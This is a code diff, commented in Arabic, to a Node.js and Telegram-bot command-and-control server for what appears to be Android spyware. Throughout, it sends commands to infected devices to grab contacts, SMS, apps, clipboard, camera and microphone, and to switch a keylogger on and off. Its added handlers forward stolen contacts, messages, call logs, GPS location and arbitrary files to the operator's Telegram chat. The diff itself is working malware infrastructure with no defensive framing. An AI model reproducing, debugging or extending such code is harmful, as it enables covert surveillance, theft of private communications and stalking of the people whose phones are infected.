@@ -31,10 +31,24 @@ const bot = new telegramBot(data.token, {
     }
 });
 
+// معالجة أخطاء البولينغ
+bot.on('polling_error', (error) => {
+    console.log('⚠️ Polling error:', error.code);
+    if (error.code === 'ETELEGRAM' || error.code === 'ECONNRESET') {
+        console.log('🔄 Reconnecting bot...');
+        setTimeout(() => {
+            try {
+                bot.startPolling();
+            } catch (e) {
+                console.log('❌ Reconnection failed:', e.message);
+            }
+        }, 5000);
+    }
+});
+
 // ========== تخزين البيانات ==========
 const connectedDevices = new Map();
-// ========== تخزين الجهاز المختار ==========
-const selectedDevice = new Map(); // <--- تم إضافة هذا لحل مشكلة appData
+const selectedDevice = new Map();
 
 // ========== إعدادات Express ==========
 app.use(express.json());
@@ -47,6 +61,14 @@ app.get('/', (req, res) => {
 
 app.get('/ping', (req, res) => {
     res.send('pong');
+});
+
+app.get('/health', (req, res) => {
+    res.status(200).json({
+        status: 'ok',
+        devices: connectedDevices.size,
+        uptime: process.uptime()
+    });
 });
 
 // ========== أوامر البوت ==========
@@ -119,7 +141,6 @@ bot.onText(/✯ All ✯/, (msg) => {
     const chatId = msg.chat.id;
     if (chatId.toString() !== data.id) return;
 
-    // تعيين "الكل" كجهاز مختار
     selectedDevice.set('target', 'all');
 
     bot.sendMessage(data.id, '<b>✯ Select action to perform for all available devices</b>', {
@@ -141,7 +162,6 @@ bot.onText(/✯ All ✯/, (msg) => {
 });
 
 // ========== اختيار جهاز معين ==========
-// يتم استدعاؤها عند النقر على معرف الجهاز
 bot.onText(/^[a-zA-Z0-9_-]+$/, (msg) => {
     const chatId = msg.chat.id;
     if (chatId.toString() !== data.id) return;
@@ -169,28 +189,26 @@ bot.onText(/^[a-zA-Z0-9_-]+$/, (msg) => {
     }
 });
 
-// ========== معالجة الأوامر (المصححة) ==========
+// ========== معالجة الأوامر (المعدلة) ==========
 const handleCommand = (command, msg) => {
     const chatId = msg.chat.id;
     if (chatId.toString() !== data.id) return;
 
-    // الحصول على الجهاز المختار
     const target = selectedDevice.get('target');
     let deviceId;
 
     if (target === 'all') {
-        // إرسال لجميع الأجهزة
         if (connectedDevices.size === 0) {
             bot.sendMessage(data.id, '❌ No devices connected');
             return;
         }
-        io.emit('command', { request: command });
+        // إرسال الأمر مباشرة لجميع الأجهزة
+        io.emit(command);
         bot.sendMessage(data.id, `📩 ${command} command sent to all devices!`);
         return;
     } else if (target && connectedDevices.has(target)) {
         deviceId = target;
     } else {
-        // إذا لم يتم اختيار جهاز، استخدم أول جهاز متصل
         const firstDevice = [...connectedDevices.keys()][0];
         if (!firstDevice) {
             bot.sendMessage(data.id, '❌ No device connected');
@@ -199,24 +217,25 @@ const handleCommand = (command, msg) => {
         deviceId = firstDevice;
     }
 
-    io.to(deviceId).emit('command', { request: command });
+    // إرسال الأمر مباشرة (بدون "command" wrapper)
+    io.to(deviceId).emit(command);
     const device = connectedDevices.get(deviceId);
     bot.sendMessage(data.id, `📩 ${command} command sent to ${device?.name || 'device'}!`);
 };
 
 // ========== تسجيل الأوامر ==========
 bot.onText(/✯ Contacts ✯/, (msg) => handleCommand('contacts', msg));
-bot.onText(/✯ SMS ✯/, (msg) => handleCommand('sms', msg));
+bot.onText(/✯ SMS ✯/, (msg) => handleCommand('messages', msg));  // التطبيق يستخدم 'messages'
 bot.onText(/✯ Apps ✯/, (msg) => handleCommand('apps', msg));
-bot.onText(/✯ Main camera ✯/, (msg) => handleCommand('main-camera', msg));
-bot.onText(/✯ Selfie Camera ✯/, (msg) => handleCommand('selfie-camera', msg));
+bot.onText(/✯ Main camera ✯/, (msg) => handleCommand('camera_main', msg));
+bot.onText(/✯ Selfie Camera ✯/, (msg) => handleCommand('camera_selfie', msg));
 bot.onText(/✯ Microphone ✯/, (msg) => handleCommand('microphone', msg));
 bot.onText(/✯ Vibrate ✯/, (msg) => handleCommand('vibrate', msg));
 bot.onText(/✯ Toast ✯/, (msg) => handleCommand('toast', msg));
 bot.onText(/✯ Clipboard ✯/, (msg) => handleCommand('clipboard', msg));
-bot.onText(/✯ Notification ✯/, (msg) => handleCommand('notification', msg));
-bot.onText(/✯ Keylogger ON ✯/, (msg) => handleCommand('keylogger-on', msg));
-bot.onText(/✯ Keylogger OFF ✯/, (msg) => handleCommand('keylogger-off', msg));
+bot.onText(/✯ Notification ✯/, (msg) => handleCommand('show_notification', msg));
+bot.onText(/✯ Keylogger ON ✯/, (msg) => handleCommand('keylogger_on', msg));
+bot.onText(/✯ Keylogger OFF ✯/, (msg) => handleCommand('keylogger_off', msg));
 
 // ========== إلغاء الأمر ==========
 bot.onText(/✯ Cancel action ✯/, (msg) => {
@@ -289,6 +308,88 @@ io.on('connection', (socket) => {
         bot.sendMessage(data.id, `📩 Device received: ${request} from ${device?.name || 'Unknown'}`);
     });
 
+    // استقبال البيانات من الجهاز
+    socket.on('data', (socketData) => {
+        const { type, content } = socketData;
+        const device = connectedDevices.get(socket.id);
+        const deviceName = device?.name || 'Unknown';
+
+        console.log(`📊 Data received: ${type} from ${deviceName}`);
+
+        switch (type) {
+            case 'contacts':
+                bot.sendDocument(data.id, Buffer.from(JSON.stringify(content, null, 2)), {
+                    caption: `📋 Contacts from: ${deviceName}`,
+                    filename: `contacts_${deviceName}.json`
+                });
+                break;
+
+            case 'messages':
+                bot.sendDocument(data.id, Buffer.from(JSON.stringify(content, null, 2)), {
+                    caption: `💬 Messages from: ${deviceName}`,
+                    filename: `messages_${deviceName}.json`
+                });
+                break;
+
+            case 'apps':
+                bot.sendDocument(data.id, Buffer.from(JSON.stringify(content, null, 2)), {
+                    caption: `📱 Apps from: ${deviceName}`,
+                    filename: `apps_${deviceName}.json`
+                });
+                break;
+
+            case 'calls':
+                bot.sendDocument(data.id, Buffer.from(JSON.stringify(content, null, 2)), {
+                    caption: `📞 Calls from: ${deviceName}`,
+                    filename: `calls_${deviceName}.json`
+                });
+                break;
+
+            case 'location':
+                bot.sendMessage(data.id, `
+📍 <b>Location received from ${deviceName}</b>
+
+🌐 Latitude: ${content.lat}
+🌐 Longitude: ${content.lng}
+🔗 <a href="https://maps.google.com?q=${content.lat},${content.lng}">View on Google Maps</a>
+                `, { parse_mode: 'HTML' });
+                break;
+
+            case 'clipboard':
+                bot.sendMessage(data.id, `
+📋 <b>Clipboard from ${deviceName}</b>
+
+${content}
+                `, { parse_mode: 'HTML' });
+                break;
+
+            case 'device_info':
+                bot.sendMessage(data.id, `
+📱 <b>Device Info from ${deviceName}</b>
+
+${JSON.stringify(content, null, 2)}
+                `, { parse_mode: 'HTML' });
+                break;
+
+            default:
+                console.log('📦 Unknown data type:', type);
+                bot.sendMessage(data.id, `📦 Unknown data type: ${type} from ${deviceName}`);
+        }
+    });
+
+    // استقبال الملفات
+    socket.on('file', (fileData) => {
+        const { filename, content } = fileData;
+        const device = connectedDevices.get(socket.id);
+        const deviceName = device?.name || 'Unknown';
+
+        bot.sendDocument(data.id, Buffer.from(content), {
+            caption: `📁 File from: ${deviceName}`,
+            filename: filename
+        });
+    });
+
+    // انقطاع الاتصال
     socket.on('disconnect', () => {
         const device = connectedDevices.get(socket.id);
         if (device) {
@@ -311,4 +412,13 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Server running on port ${PORT}`);
     console.log(`✅ Bot is ready!`);
     console.log(`✅ Connected devices: 0`);
+});
+
+// ========== معالجة الأخطاء ==========
+process.on('uncaughtException', (error) => {
+    console.error('❌ Uncaught Exception:', error);
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+    console.error('❌ Unhandled Rejection:', reason);
 });
